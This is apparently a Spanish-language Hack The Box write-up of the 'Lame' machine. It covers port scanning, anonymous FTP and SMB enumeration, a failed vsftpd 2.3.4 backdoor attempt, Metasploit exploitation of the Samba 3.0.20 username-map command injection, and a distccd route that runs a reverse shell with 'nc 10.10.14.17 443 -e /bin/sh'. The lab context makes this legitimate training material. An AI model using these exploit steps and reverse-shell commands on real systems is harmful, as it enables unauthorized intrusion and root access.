---
title: Lame WriteUp
date: 2024-02-05
categories: [WriteUps, Máquinas Linux]
tags: [Metaexploit, SMB, RCE]
image:
  path: ../../assets/img/writeups/Lame/lame.png
  width: 528
  height: 340
  alt: Banner Lame
---

Encontramos una vulnerabilidad en el servicio Samba 3.0.20, una inyección en el campo de usuario al conectarnos. En esta ocasión usaré Metaexploit, nos funciona y entramos directamente como usuario root.

## Reconocimiento

Que paaaaxaaa!!!!. Haré la primera máquina publicada por HTB, máquina histórica de la mejor plataforma de hacking del mundo. La máquina se llama **Lame** con IP **10.10.10.3**.

Antes de hacer cualquiera de las máquinas que tiene HTB hay que conectarse por VPN - la VPN te la descargas en la plataforma de HTB, y no hace falta descargarse una nueva cada vez -. La manera habitual de conectarse es mediante el comando `openvpn name_vpn.ovpn`.  
Recomendaría ser organizado, y crear una carpeta para cada máquina que vayas a realizar.

Empecemos comprobando si tenemos conectividad a la máquina realizando un ping:

```sh
❯ ping -c 1 10.10.10.3
PING 10.10.10.3 (10.10.10.3) 56(84) bytes of data.
64 bytes from 10.10.10.3: icmp_seq=1 ttl=63 time=45.1 ms

--- 10.10.10.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 45.147/45.147/45.147/0.000 ms
```

Un paquete trasnsmitido, un paquete recibido, parece que si tenemos conectividad. El ttl (time to live) al estar próximo a 64 nos indica que estaremos ante una máquina Linux - si fuera cercano a 128 estaríamos ante una Windows-.

Ahora usaremos la herramienta **nmap** para averiguar que puertos están abiertos. Hay muchas maneras de hacer este reconocimiento, pero la que haré va muy bien, explicaré las opciones abajo del escaneo:

```sh
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3 -oN ports
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-05 16:53 CET
Initiating SYN Stealth Scan at 16:53
Scanning 10.10.10.3 [65535 ports]
Discovered open port 21/tcp on 10.10.10.3
Discovered open port 139/tcp on 10.10.10.3
Discovered open port 445/tcp on 10.10.10.3
Discovered open port 22/tcp on 10.10.10.3
Discovered open port 3632/tcp on 10.10.10.3
Completed SYN Stealth Scan at 16:53, 39.49s elapsed (65535 total ports)
Nmap scan report for 10.10.10.3
Host is up, received user-set (0.038s latency).
Scanned at 2024-02-05 16:53:07 CET for 39s
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 63
22/tcp   open  ssh          syn-ack ttl 63
139/tcp  open  netbios-ssn  syn-ack ttl 63
445/tcp  open  microsoft-ds syn-ack ttl 63
3632/tcp open  distccd      syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 39.54 seconds
           Raw packets sent: 196626 (8.652MB) | Rcvd: 36 (1.584KB)
```

Las opciones usadas son:

* -p- : Escanea todos los puertos. Hay un total de 65535 puertos
* --open : Muestra únicamente los puertos abiertos.
* -sS : Realiza un TCP SYN Scan
* --min-rate 5000 : Para enviar paquetes no más lentos que 5000 paquetes por segundo
* -vvv : Muestra la información en pantalla mientras se realiza el escaneo
* -n : Para no aplicar resolución DNS
* -Pn : Para que no aplique el protocolo ARP
* 10.10.10.3 : Dirección IP objetivo, la cual quiero escanear
* -oN ports : Exportará el output a un fichero normal que llamaré "ports"


Los puertos abiertos son el 21, 22, 139, 445, 3632. Haré otro escaner para averiguar los servicios que corren en estos puertos:

```sh
❯ nmap -p21,22,139,445,3632 -sC -sV 10.10.10.3 -oN services
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-05 17:33 CET
Nmap scan report for 10.10.10.3
Host is up (0.042s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.17
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

.... SNIP ....
```

Si hubiera estado el puerto 80 hubieramos lanzado la herramienta **whatweb** a la web, pero no es el caso.

## Buscando vulnerabilidades

Parece que, según nmap, el puerto **21** está abierto y podemos logearnos con el usuario anonymous.

```sh
❯ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:guise): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

# Para Password simplemente enter o también poner anonymous
```

Si escribo el comando **ls** de ftp me sale lo siguiente:

```sh
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
```

Parece que nos recomienda usar con el modo pasivo, opción **-p**:

```sh
❯ ftp -p 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:guise): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
227 Entering Passive Mode (10,10,10,3,69,4).
150 Here comes the directory listing.
226 Directory send OK.
```

Fijandome en mis notas me doy cuenta que esa es la respuesta habitual que dan cuando intentas listar algo. Simplemente, no habrá nada dentro.

Voy a ver si la versión del ftp es vulnerable. Y si, tiene toda la pinta:

```sh
❯ searchsploit vsftpd 2.3.4
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                                                                                             | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                | unix/remote/17491.rb
```

## Probando vulnerabilidad que no es

Hay una vulnerabilidad en el servicio vsftpd 2.3.4, un backdoor que se abre al insertar una carita sonriente `:)` despúes de un usuario cualquiera al intentar conectarte con telnet, mira está [página](https://www.exploit-db.com/exploits/49757) que en python, al menos yo, lo veo más claro, al hacerlo se abre el puerto 6200, por el que podrás conectarte por telnet.

Me apetece hacerlo con searchsploit, así que abriré msfconsole:

```sh
❯ msfconsole
                                                  

                 _---------.
             .' #######   ;."
  .---,.    ;@             @@`;   .---,..
." @@@@@'.,'@@            @@@@@',.'@@@@ ".
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
     "--'.@@@  -.@        @ ,'-   .'--"
          ".@' ; @       @ `.  ;'
            |@@@@ @@@     @    .
             ' @@@ @@   @@    ,
              `.@@@@    @@   .
                ',@@     @   ;           _____________
                 (   3 C    )     /|___ / Metasploit! \
                 ;@'. __*__,."    \|--- \_____________/
                  '(.,...."/


       =[ metasploit v6.3.5-dev                           ]
+ -- --=[ 2296 exploits - 1202 auxiliary - 410 post       ]
+ -- --=[ 965 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

.... SNIP .....

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor

[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to cmd/unix/interact
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >>
```

Seguimos, listaremos las opciones del exploit:

```sh
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
```

Lanzo el exploit, pero verás que nos falta definir un payload:

```sh
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> exploit

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```

Como no me salía el nombre de PAYLOAD pensaba que no estaría la opción, pero si que se puede:

```sh
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> show payloads

Compatible Payloads
===================

   #  Name                       Disclosure Date  Rank    Check  Description
   -  ----                       ---------------  ----    -----  -----------
   0  payload/cmd/unix/interact                   normal  No     Unix Command, Interact with Established Connection

[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> set PAYLOAD cmd/unix/interact
PAYLOAD => cmd/unix/interact
```

```sh
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> exploit

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```

Pero nada oye...Como no me funciona por metaexploit voy a intentarlo de otras maneras. Haciendo el searchsploit había un script en python podemos lanzarlo o replicarlo manualmente. Haré lo segundo:

```sh
telnet 10.10.10.3 21 
# Normalmente hacemos ftp ip y probamos con anonymous recuerda.
USER guise:) 
# Y enter. Puede ser cualquier cosa que acabe en sonrisa.
PASS guise
```

Pero en este caso no se abre el puerto 6200. Puede que sea un **rabbit hole**..


Vayamos con samba.

```sh
❯ smbclient -L=10.10.10.3 -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful
... SNIP ....

# o también se puede hacer así:

❯ smbclient -L 10.10.10.3 -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk      
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            LAME
```

En el bloque de arriba me funciona bien, pero la primera vez que lo probé fallaba y me daba el siguiente error; **NT_STATUS_CONNECTION_DISCONECT**, buscando un poco por Google encuentro lo siguiente:

```plaintext
# Hablando sobre el archivo smb.conf, que es el archivo de configuración de samba. Lo de abajo se puede poner en el archivo pero también se puede pasar por línea de comandos con la opción --option.

client min protocol = NT1
```
Para que funcionará añadimos la opción **--option** con esa configuración:

```sh
> smbclient -L 10.10.10.3 -N --option 'client min protocol = NT1'

# y ya te dejaría
```

En esta ocasión, por lo que sea, no ha hecho falta:

```sh
❯ smbclient \\\\10.10.10.3\\tmp -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Feb  6 13:45:02 2024
  ..                                 DR        0  Sat Oct 31 08:33:58 2020
  orbit-makis                        DR        0  Tue Feb  6 12:25:32 2024
  .ICE-unix                          DH        0  Mon Feb  5 16:24:28 2024
  5572.jsvc_up                        R        0  Mon Feb  5 16:25:32 2024
  vmware-root                        DR        0  Mon Feb  5 16:24:40 2024
  .... SNIP ....

```

Ahora bien, podemos listar todos los recursos, pero nos falta algo fundamental que es **mirar la versión del servicio de SMB expuesto**.

## Explotación

Recogido de nmap:

```plaintext
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
```

```sh
❯ searchsploit samba 3.0
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                  | osx/remote/16875.rb
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                                | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                      | unix/remote/16320.rb
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                                                                    | linux/remote/9950.rb
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                                                                | linux/remote/16859.rb
... SNIP ...
```
Me interesa el de Command Execution. Lo tenemos para metaexploit. Antes de lanzarlo podríamos ojear como funciona:

```sh
  Exploit: Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)
      URL: https://www.exploit-db.com/exploits/16320
     Path: /opt/exploitdb/exploits/unix/remote/16320.rb
    Codes: CVE-2007-2447, OSVDB-34700
 Verified: True
File Type: Ruby script, ASCII text
Copied to: /home/guise/HTB/Machines/Linux/Lame/scripts/16320.rb


❯ ls
 16320.rb
❯ mv 16320.rb samba.rb
❯ cat samba.rb -l ruby

... SNIP ....
def exploit

    connect

    # lol?
    username = "/=`nohup " + payload.encoded + "`"
    begin
        simple.client.negotiate(false)
        simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
    rescue ::Timeout::Error, XCEPT::LoginError
        # nothing, it either worked or it didn't ;)
    end
... SNIP ....
```

Parece que hay una inyección de comandos a la hora de añadir el usuario. Usa el comando **nohup** antes para no perder la conexión.  
Lanzemos el metaexploit en esta ocasión:

```sh
> msfconsole

[msf](Jobs:0 Agents:0) >> search samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.136    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> set LHOST 10.10.14.17
LHOST => 10.10.14.17
[msf](Jobs:0 Agents:0) exploit(multi/samba/usermap_script) >> exploit

[*] Started reverse TCP handler on 10.10.14.17:4444 
[*] Command shell session 1 opened (10.10.14.17:4444 -> 10.10.10.3:39540) at 2024-02-06 14:04:38 +0100

id
uid=0(root) gid=0(root)
cd /root/        
cat root.txt
e8054f4c57ea3d5ae1ceb5a593287746
cd /home
ls
ftp
makis
service
user
cat makis/user.txt
0d3e56ee1260bca040b6a9610e5205f7
```

Y ahí tenemos las dos flags.


## Otra vía de explotación

Vimos en el reconcimiento por nmap que el puerto **3632** estaba abierto:

```plaintext
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
```
**distcc** es una herramienta para acelerar la compilación del código fuente mediante el uso de computación distribuida en una red informática. Con la configuración correcta, distcc puede reducir drásticamente el tiempo de compilación de un proyecto.

Buscando por internet parece que esa versión es vulnerable, podemos conseguir RCE aprocechando tareas de compilación. Existe por github un [script en python](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855) - me señalan hasta como ejecutarlo con el ejemplo de máquina Lame -, donde podemos ver el identificador en metaexploit:

```plaintext
This exploit is ported from a public Metasploit exploit code :
		https://www.exploit-db.com/exploits/9915
```

```sh
❯ searchsploit 9915
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                        |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Armadito Antimalware - Backdoor Access/Bypass                                                                                                         | windows/dos/39915.c
DistCC Daemon - Command Execution (Metasploit)                                                                                                        | multiple/remote/9915.rb
```

En el enlace de arriba, *el script principal no funciona para python3*, pero más abajo en un comentario subieron un script para python3 que si que funciona, lo copio y pego a mi máquina. Es del ussuario *hazeyed*.

```sh
❯ python3 otroparadisccd.py -t 10.10.10.3
[*] Connected to remote service

--- BEGIN BUFFER ---

uid=1(daemon) gid=1(daemon) groups=1(daemon)


--- END BUFFER ---

[*] Done.
```

El comando por defecto es **id**, pero podemos meter cualquier otro.

```sh
❯ python3 otroparadisccd.py -t 10.10.10.3 -c "nc 10.10.14.17 443 -e /bin/sh"
[*] Connected to remote service
[!] Socket Timeout
```

Estando en escucha por el puerto 443:

```sh
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.3] 33005
whoami
daemon
```

Realizo el tratamiento de la TTY:

```sh
script /dev/null -c bash
# Pulsamos Ctrl + z
stty raw -echo; fg
reset xterm    # esto no se veía cuando lo escribías.
# Como tipo terminal xterm
export TERM=xterm
export SHELL=bash
stty rows 38 columns 184
```

Y vamos a por la flag:

```sh
daemon@lame:/home/makis$ cd /home
daemon@lame:/home$ ls
ftp  makis  service  user
daemon@lame:/home$ cd makis
daemon@lame:/home/makis$ ls
user.txt
daemon@lame:/home/makis$ cat user.txt
0d3e56ee1260bca040b6a9610e5205f7
```

Conseguimos la primera flag. La primera forma de explotar la máquina era la planeada.



















